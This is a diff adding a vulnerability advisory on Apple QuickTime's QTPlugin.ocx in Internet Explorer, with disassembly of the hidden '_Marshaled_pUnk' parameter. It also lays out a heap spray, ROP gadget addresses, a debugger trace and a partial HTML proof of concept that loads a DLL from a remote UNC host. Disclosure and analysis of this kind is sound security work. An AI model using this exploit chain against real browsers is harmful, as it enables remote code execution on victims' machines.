@@ -1,0 +1,334 @@
+Original Source: http://reversemode.com/index.php?option=com_content&task=view&id=69&Itemid=1
+
+Victim prerequisites:
+
+* Internet Explorer.
+* XP,Vista,W7.
+* Apple Quicktime 7.x, 6.x ( 2004 versions are also vulnerable, older versions not checked )
+
+1. Victim is enticed into visiting, by any mean, a specially crafted webpage.
+2. Attacker's payload to be executed under the context of the browser.
+3. Attacker calls his girlfriend to inform about the successful exploitation, who indeed turns out to be very interested in the issue. She demands more technical details.
+4. Attacker wakes up.
+
+
+Technical details
+
+QTPlugin.ocx implements IPersistPropertyBag2::Read (1000E330) to handle params received from where it is embedded, including HTML documents.
+
+Let's take a look
+
+.text:1000E330
+.text:1000E330 ; =============== S U B R O U T I N E =======================================
+.text:1000E330
+.text:1000E330
+.text:1000E330 sub_1000E330    proc near               ; DATA XREF: .rdata:1002E0ECo
+.text:1000E330                                         ; .rdata:1002E86Co
+.text:1000E330
+.text:1000E330 arg_0           = dword ptr  4
+.text:1000E330 arg_4           = dword ptr  8
+.text:1000E330 arg_8           = dword ptr  0Ch
+.text:1000E330
+.text:1000E330                 push    esi
+.text:1000E331                 mov     esi, [esp+4+arg_0]
+.text:1000E335                 mov     ecx, [esi+84h]
+.text:1000E33B                 xor     eax, eax
+.text:1000E33D                 test    ecx, ecx
+.text:1000E33F                 jz      short loc_1000E393
+.text:1000E341                 mov     eax, [esp+4+arg_8]
+.text:1000E345                 mov     edx, [esp+4+arg_4]
+.text:1000E349                 push    eax
+.text:1000E34A                 push    edx
+.text:1000E34B                 call    sub_100031F0 
+
+
+
+Following the flow...
+
+sub_10002980+27A
+sub_10002980+27A  loc_10002BFA:                           ; CODE XREF: sub_10002980+266j
+sub_10002980+27A                                          ; sub_10002980+272j
+sub_10002980+27A                  push    offset aType    ; "type"
+sub_10002980+27F                  push    ebx             ; lpString1
+sub_10002980+280                  call    ebp ; lstrcmpiA
+sub_10002980+282                  test    eax, eax
+sub_10002980+284                  jnz     short loc_10002C22
+sub_10002980+286                  push    edi             ; lpString
+sub_10002980+287                  call    ds:lstrlenA
+sub_10002980+28D                  cmp     eax, 104h
+sub_10002980+292                  jnb     short loc_10002C22
+sub_10002980+294                  push    edi             ; lpString2
+sub_10002980+295                  lea     edx, [esi+83Ch]
+sub_10002980+29B                  push    edx             ; lpString1
+sub_10002980+29C                  call    ds:lstrcpyA
+sub_10002980+2A2
+sub_10002980+2A2  loc_10002C22:                           ; CODE XREF: sub_10002980+284j
+sub_10002980+2A2                                          ; sub_10002980+292j
+sub_10002980+2A2                  push    offset a_marshaled_pun ; "_Marshaled_pUnk"
+sub_10002980+2A7                  push    ebx             ; lpString1
+sub_10002980+2A8                  call    ebp ; lstrcmpiA
+sub_10002980+2AA                  test    eax, eax
+sub_10002980+2AC                  jnz     short loc_10002C4A
+sub_10002980+2AE                  push    edi
+sub_10002980+2AF                  call    sub_10001310   ; SIMPLE ASCII NUMBERS TO LONG routine
+sub_10002980+2B4                  add     esp, 4
+sub_10002980+2B7                  lea     ecx, [esi+13B8h]
+sub_10002980+2BD                  push    ecx             ; ppv
+sub_10002980+2BE                  push    offset iid      ; iid
+sub_10002980+2C3                  push    eax             ; pStm
+sub_10002980+2C4                  call    ds:CoGetInterfaceAndReleaseStream  ; WE HAVE A WINNER!!
+sub_10002980+2CA
+sub_10002980+2CA  loc_10002C4A:                           ; CODE XREF: sub_10002980+2ACj
+sub_10002980+2CA                  push    edi             ; int
+
+
+
+
+Oops! programming rules state that hidden properties should be preceded by "_" so this property matches the requirement. It's time to google "_Marshaled_pUnk" which brings us 0 results. Apple scripting guide for Quicktime does not even mention it. Weird.
+
+What's is going on here?
+
+QTPlugin.OCX checks for the existence of "_Marshaled_pUnk" within object's attributes, if so, unmarshals it by converting the address from its ascii representation into a numerical one ( sub_10001310 ). Then, it uses the resulting pointer as pStm,"A pointer to the IStream interface on the stream to be unmarshaled", CoGetInterfaceAndReleaseStream in order to obtain the IUnknown pointer (pUnk from now on) of the marshalled interface. This method is pretty common for sharing interface pointers between threads within COM enabled scenarios ( e.g browsers + plugins ).
+
+So we are controlling an IStream pointer, which is good :)
+
+However at this point the things didn't make sense for me. Despite of the fact that a CPluginHost object's variable holds this pointer (pPlugin+0x13b8), pUnk is never used,. According to the COM model, this pointer shouldn't be used by any other thread. Why in the hell an apple engineer implemented this? A conspiration between NSA, FSB and the bloody Andorra's secret service may be possible but I think there must be another explanation.
+
+Back to the future
+
+So I am downloading an older version of QTPlugin.ocx, which dates from 2004 (6.5.1.17), to try to explain an issue in 2010, cool.
+
+Module: QTPlugin.ocx
+
+.text:6670BE86                 mov     eax, [ebp+1480h ; pPlugin->pUnk ]
+.text:6670BE8C                 cmp     eax, edi
+.text:6670BE8E                 jz      short loc_6670BEF7
+.text:6670BE90                 lea     edx, [esp+7Ch+pHandles]
+.text:6670BE97                 mov     [esp+7Ch+pHandles], edi
+.text:6670BE9E                 mov     ecx, [eax]
+.text:6670BEA0                 push    edx
+.text:6670BEA1                 push    offset dword_667214C8 ;  IID_IViewObject
+.text:6670BEA6                 push    eax
+.text:6670BEA7                 call    dword ptr [ecx]  ; pUnk->QueryInterface(IID_IViewObject,pView)
+.text:6670BEA9                 test    eax, eax
+.text:6670BEAB                 jl      short loc_6670BEF7
+.text:6670BEAD                 mov     edx, [esp+7Ch+arg_10]
+.text:6670BEB4                 push    edi
+.text:6670BEB5                 push    edi
+.text:6670BEB6                 mov     eax, [esp+84h+pHandles]
+.text:6670BEBD                 push    edx
+.text:6670BEBE                 mov     edx, [esp+88h+arg_C]
+.text:6670BEC5                 mov     ecx, [eax]
+.text:6670BEC7                 push    edx
+.text:6670BEC8                 mov     edx, [esp+8Ch+hdc]
+.text:6670BECF                 push    edx
+.text:6670BED0                 mov     edx, [esp+90h+arg_4]
+.text:6670BED7                 push    esi
+.text:6670BED8                 push    edi
+.text:6670BED9                 push    edi
+.text:6670BEDA                 push    0FFFFFFFFh
+.text:6670BEDC                 push    edx
+.text:6670BEDD                 push    eax
+.text:6670BEDE                 call    dword ptr [ecx+0Ch] ; pView->Draw(...)
+ 
+
+
+
+Reversing this function we can see that, in certain cases, QTPlugin.ocx could be instructed to draw contents onto an existing window instead of creating a new one. Mistery solved.
+
+However, although this functionality was removed in newer versions, the param is still present. Why? I guess someone forgot to clean up the code .
+
+Exploiting it
+
+We are controlling the IStream Pointer passed to CoGetInterfaceAndReleaseStream, at a certain point during the execution flow of this function, an IStream method is going to be referenced.
+
+ole32!wCoGetInterfaceAndReleaseStream -> ole32!CoUnmarshalInterface -> ole32!ReadObjRef -> ole32!StRead < = p0wn!!
+
+So all we need to do is emulate a fake IStream interface in memory. How? aligned heap spray FTW!
+
+This is how our sprayed block would look in memory
+
+Heap       Value
+15220c20  15220c18  // Fake VTable pointer
+15220c24  29527ae7  // gadget1 WindowsLiveLogin
+15220c28  27582d63  // gadget2  msidcrl40.dll
+15220c2c  15220d08  // pParam for LoadLibrary (DLL UNC PATH )
+15220c30  15220cbc  // -add     ecx, 0A0h, mov     eax, [ecx]...- gadget2
+15220c34  15220cbc
+15220c38  15220cbc
+15220c3c  15220cbc
+15220c40  15220cbc
+15220c44  15220cbc
+15220c48  15220cbc
+15220c4c  15220cbc
+15220c50  15220cbc
+15220c54  15220cbc
+15220c58  15220cbc
+15220c5c  15220cbc
+15220c60  15220cbc
+15220c64  15220cbc
+15220c68  15220cbc
+[...]
+15220c98  15220cbc
+15220c9c  15220cbc
+15220ca0  15220cbc
+15220ca4  15220cbc
+15220ca8  15220cbc
+15220cac  15220cbc
+15220cb0  15220cbc
+15220cb4  15220cbc
+15220cb8  15220cbc
+15220cbc  15220cbc
+15220cc0  15220cbc
+15220cc4  15220cbc
+15220cc8  295481e8
+15220ccc  295481e8   // LoadLibraryA 
+15220cd0  295481e8
+15220cd4  295481e8
+15220cd8  295481e8
+15220cdc  295481e8
+15220ce0  295481e8
+15220ce4  295481e8
+15220ce8  295481e8
+15220cec  295481e8
+15220cf0  295481e8
+15220cf4  295481e8
+15220cf8  295481e8
+15220cfc  295481e8
+15220d00  295481e8
+15220d04  295481e8
+15220d08  70785c5c  // DLL UNC PATH  "\\xpl8.nu\1"
+15220d0c  6e2e386c
+15220d10  00315c75
+
+
+
+Data is sprayed in such a manner we know that, despite of ASLR, at 0xXXXXX020, 0xXXXXX420,0xXXXXX820,0xXXXXXc20 our block can be located.
+
+As you can see a couple of gadgets are used, since this is a ROP exploit, however esp is not controlled at all. I'm taking advantage of common code generated by c++ compilers to control parameters and execution.
+
+The gadgets come from Windows Live messenger dlls that are loaded by default on IE and have no ASLR flag.
+
+0x29527AE7 WindowsLiveLogin.dll gadget1
+
+mov     edx, [esi+0Ch]
+mov     eax, [esi+8] 
+push    edi
+push    offset dword_29501B68
+push    edx
+call    eax
+
+0x27582D63 msidcrl40.dll gadget2
+
+add     ecx, 0A0h
+mov     eax, [ecx]
+mov     eax, [eax+10h]
+pop     ebp
+jmp     eax
+
+
+
+
+stepping into the payload
+
+ole32!StRead+0x15:
+75c9af58 ff510c          call    dword ptr [ecx+0Ch]  ds:0023:15220c24=29527ae7 
+0:004> t
+eax=15220c20 ebx=05ca72a8 ecx=15220c18 edx=02c13968 esi=15220c20 edi=02c139d0
+eip=29527ae7 esp=02c1394c ebp=02c13960 iopl=0         nv up ei pl nz na po nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
+WindowsLiveLogin!DllCanUnloadNow+0x937:
+29527ae7 8b560c          mov     edx,dword ptr [esi+0Ch] ds:0023:15220c2c=15220d08
+
+0:004> t
+eax=15220c20 ebx=05ca72a8 ecx=15220c18 edx=15220d08 esi=15220c20 edi=02c139d0
+eip=29527aea esp=02c1394c ebp=02c13960 iopl=0         nv up ei pl nz na po nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
+WindowsLiveLogin!DllCanUnloadNow+0x93a:
+29527aea 8b4608          mov     eax,dword ptr [esi+8] ds:0023:15220c28=27582d63
+
+0:004> t
+eax=27582d63 ebx=05ca72a8 ecx=15220c18 edx=15220d08 esi=15220c20 edi=02c139d0
+eip=29527aed esp=02c1394c ebp=02c13960 iopl=0         nv up ei pl nz na po nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
+WindowsLiveLogin!DllCanUnloadNow+0x93d:
+29527aed 57              push    edi
+
+0:004> t
+eax=27582d63 ebx=05ca72a8 ecx=15220c18 edx=15220d08 esi=15220c20 edi=02c139d0
+eip=29527aee esp=02c13948 ebp=02c13960 iopl=0         nv up ei pl nz na po nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
+WindowsLiveLogin!DllCanUnloadNow+0x93e:
+29527aee 68681b5029      push    offset WindowsLiveLogin+0x1b68 (29501b68)
+
+0:004> t
+eax=27582d63 ebx=05ca72a8 ecx=15220c18 edx=15220d08 esi=15220c20 edi=02c139d0
+eip=29527af3 esp=02c13944 ebp=02c13960 iopl=0         nv up ei pl nz na po nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
+WindowsLiveLogin!DllCanUnloadNow+0x943:
+29527af3 52              push    edx
+
+0:004> t
+eax=27582d63 ebx=05ca72a8 ecx=15220c18 edx=15220d08 esi=15220c20 edi=02c139d0
+eip=29527af4 esp=02c13940 ebp=02c13960 iopl=0         nv up ei pl nz na po nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
+WindowsLiveLogin!DllCanUnloadNow+0x944:
+29527af4 ffd0            call    eax {msidcrl40!EnumerateDeviceID+0xa113 (27582d63)}
+
+0:004> t
+eax=27582d63 ebx=05ca72a8 ecx=15220c18 edx=15220d08 esi=15220c20 edi=02c139d0
+eip=27582d63 esp=02c1393c ebp=02c13960 iopl=0         nv up ei pl nz na po nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
+msidcrl40!EnumerateDeviceID+0xa113:
+27582d63 81c1a0000000    add     ecx,0A0h
+
+0:004> t
+eax=27582d63 ebx=05ca72a8 ecx=15220cb8 edx=15220d08 esi=15220c20 edi=02c139d0
+eip=27582d69 esp=02c1393c ebp=02c13960 iopl=0         nv up ei pl nz na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
+msidcrl40!EnumerateDeviceID+0xa119:
+27582d69 8b01            mov     eax,dword ptr [ecx]  ds:0023:15220cb8=15220cbc
+
+0:004> t
+eax=15220cbc ebx=05ca72a8 ecx=15220cb8 edx=15220d08 esi=15220c20 edi=02c139d0
+eip=27582d6b esp=02c1393c ebp=02c13960 iopl=0         nv up ei pl nz na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
+msidcrl40!EnumerateDeviceID+0xa11b:
+27582d6b 8b4010          mov     eax,dword ptr [eax+10h] ds:0023:15220ccc=295481e8
+
+0:004> t
+eax=295481e8 ebx=05ca72a8 ecx=15220cb8 edx=15220d08 esi=15220c20 edi=02c139d0
+eip=27582d6e esp=02c1393c ebp=02c13960 iopl=0         nv up ei pl nz na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
+msidcrl40!EnumerateDeviceID+0xa11e:
+27582d6e 5d              pop     ebp
+
+0:004> t
+eax=295481e8 ebx=05ca72a8 ecx=15220cb8 edx=15220d08 esi=15220c20 edi=02c139d0
+eip=27582d6f esp=02c13940 ebp=29527af6 iopl=0         nv up ei pl nz na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
+msidcrl40!EnumerateDeviceID+0xa11f:
+27582d6f ffe0            jmp     eax {WindowsLiveLogin!DllUnregisterServer+0x1f588 (295481e8)}
+
+0:004> t
+eax=295481e8 ebx=05ca72a8 ecx=15220cb8 edx=15220d08 esi=15220c20 edi=02c139d0
+eip=295481e8 esp=02c13940 ebp=29527af6 iopl=0         nv up ei pl nz na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
+WindowsLiveLogin!DllUnregisterServer+0x1f588:
+295481e8 ff15f8105029    call    dword ptr [WindowsLiveLogin+0x10f8 (295010f8)] ds:0023:295010f8={IEShims!NS_RedirectFiles::APIHook_LoadLibraryA (63e8fbe1)}
+
+0:004> db poi(esp)
+15220d08  5c 5c 78 70 6c 38 2e 6e-75 5c 31 00 00 00 00 00  \\xpl8.nu\1.....    p0wn!! 
+
+
+
+Unfortunately, due to DLL Hijacking fiasco workaround, a LoadLibrary+UNC payload seems not very dangerous...isn't it? ;)
+
+The exploit defeats ASLR+DEP and has been successfully tested on W7, Vista and XP.
+
+A metasploit module should be available soon since I sent the exploit details to Josuah Drake some days before releasing this advisory. PoC:
+
+ addr = 354552864; // 0x15220C20 [pUnk]  
+ var obj=  '<' + 'object classid="clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B" width="0" height="0"'+'>'
+	   +'<' + 'PARAM name="_Marshaled_pUnk" value="'+addr+'"' + '/>'
+	   +'<'+'/'+'object>';
